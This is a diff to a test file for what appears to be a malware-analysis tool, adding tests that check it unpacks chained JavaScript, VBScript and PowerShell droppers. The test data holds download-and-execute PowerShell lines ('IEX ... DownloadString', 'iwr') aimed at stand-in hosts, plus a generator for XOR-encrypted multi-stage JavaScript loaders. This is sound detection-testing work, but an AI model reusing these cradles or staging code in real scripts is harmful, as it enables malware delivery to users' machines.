@@ -119,14 +119,83 @@ def test_binary_base64_is_not_turned_into_garbage() -> None:
         assert ps_deobf.deobfuscate(cmd)["code"] == cmd
 
 
+@pytest.fixture()
+def client(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
+    from fastapi.testclient import TestClient
+    from docutracex.app import create_app
+    from docutracex.config import settings
+    monkeypatch.setattr(settings, "cases_dir", tmp_path / "cases")
+    (tmp_path / "cases").mkdir()
+    return TestClient(create_app())
+
+
+def _analyze(client, name: str, data: bytes) -> tuple[str, Path]:
+    import time
+    from docutracex.config import settings
+    r = client.post("/api/cases", files={"file": (name, data)}).json()
+    tid = r["task"]["id"]
+    for _ in range(1200):
+        t = next((x for x in client.get("/api/tasks").json()["tasks"] if x["id"] == tid), {})
+        if t.get("state") in ("completed", "failed"):
+            break
+        time.sleep(0.05)
+    return r["analysis_id"], settings.cases_dir / r["analysis_id"] / "results"
+
+
+def _tree(results: Path) -> list[dict]:
+    import json
+    return json.loads((results / "nested.json").read_text())["tree"]
+
+
 @pytest.mark.skipif(not _have_v8(), reason="STPyV8 not installed")
-def test_js_to_powershell_full_chain(tmp_path: Path) -> None:
-    from docutracex.parsers import powershell
-    f = tmp_path / "c.js"
-    f.write_bytes(_ms().chain_dropper_js())
-    js = J.analyze(f, tmp_path / "none", {})
-    ps = powershell.analyze(tmp_path / "x.bin", tmp_path / "none", {"javascript": js})
-    assert len(ps["scripts"]) == 1                          # XOR result and Run() deduplicated
-    sc = ps["scripts"][0]
-    assert "stage4.ps1" in sc["code"] and "inv_viewer.exe" in sc["code"]
-    assert {"ps_download", "ps_encoded"} <= {x["rule"] for x in ps["findings"]}
+def test_chain_js_vbs_powershell_as_nested(client) -> None:
+    import json
+    _, res = _analyze(client, "sample_chain_dropper.js", _ms().chain_dropper_js())
+    tree = _tree(res)
+    vbs = next(n for n in tree if n["filename"].endswith(".vbs"))
+    assert vbs["decrypted_from"].startswith("JavaScript") and vbs["kind"] == "script"
+    assert {"vbscript", "powershell"} <= set(vbs["code"])           # re-analysed by both
+    assert {"vbs_shell", "ps_download"} <= {f["rule"] for f in vbs["findings"]}
+    iocs = {i["value"] for i in json.loads((res / "iocs.json").read_text())["iocs"]}
+    assert "http://billing-portal.example/inv/stage4.ps1" in iocs  # the final stage
+
+
+@pytest.mark.skipif(not _have_v8(), reason="STPyV8 not installed")
+def test_decrypted_stages_are_followed_recursively(client) -> None:
+    def xor_js(payload: str, key: str = "k3y") -> str:
+        arr = ",".join(str(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(payload))
+        return (f'var k = "{key}";\nvar d = [{arr}];\n'
+                "function dec(a, key) { var o = ''; for (var i = 0; i < a.length; i++) "
+                "{ o += String.fromCharCode(a[i] ^ key.charCodeAt(i % key.length)); } return o; }\n"
+                "var fso = new ActiveXObject('Scripting.FileSystemObject');\n"
+                "fso.CreateTextFile('s.tmp', true).Write(dec(d, k));\n")
+    ps = "IEX (New-Object Net.WebClient).DownloadString('http://billing-portal.example/deep.ps1')"
+    stage2 = xor_js(ps, "two")                 # JS that decrypts PowerShell
+    stage1 = xor_js(stage2, "one")             # JS that decrypts stage2
+    _, res = _analyze(client, "deep.js", stage1.encode())
+    js2 = next(n for n in _tree(res) if n["filename"].endswith(".js"))
+    assert js2["decrypted_from"]
+    ps1 = next(n for n in js2["children"] if n["filename"].endswith(".ps1"))
+    assert ps1["decrypted_from"] and "ps_download" in {f["rule"] for f in ps1["findings"]}
+
+
+def test_decrypted_payloads_and_sniffing(tmp_path: Path) -> None:
+    import base64
+    from docutracex import decrypted
+    assert decrypted.sniff_ext("powershell -nop -enc AAAA") == ".ps1"
+    assert decrypted.sniff_ext('Dim a\r\nSet a = CreateObject("WScript.Shell")') == ".vbs"
+    assert decrypted.sniff_ext("var a = 1; new ActiveXObject('x');") == ".js"
+    assert decrypted.sniff_ext("@echo off\r\nset x=1") == ".bat"
+    pe = b"MZ" + b"\x90" * 300 + b"This program cannot be run in DOS mode (inert stub)"
+    mods = {
+        "javascript": {"scripts": [{"location": "a.js", "sandbox": {"log": [
+            {"kind": "xor", "name": "dec", "args": ["powershell -nop -c iwr http://x.example/a"]}]}}]},
+        "powershell": {"scripts": [{"location": "b.ps1",
+                                    "code": f"$x = '{base64.b64encode(pe).decode()}'"}]},
+    }
+    got = decrypted.payloads_from(mods)
+    assert {p["how"] for p in got} == {"js-xor-dec", "powershell-base64"}
+    items = decrypted.write(got, tmp_path / "decrypted")
+    names = sorted(i["filename"] for i in items)
+    assert names[0].endswith(".ps1") and names[1].endswith(".exe")
+    assert (tmp_path / "decrypted" / names[1]).read_bytes() == pe
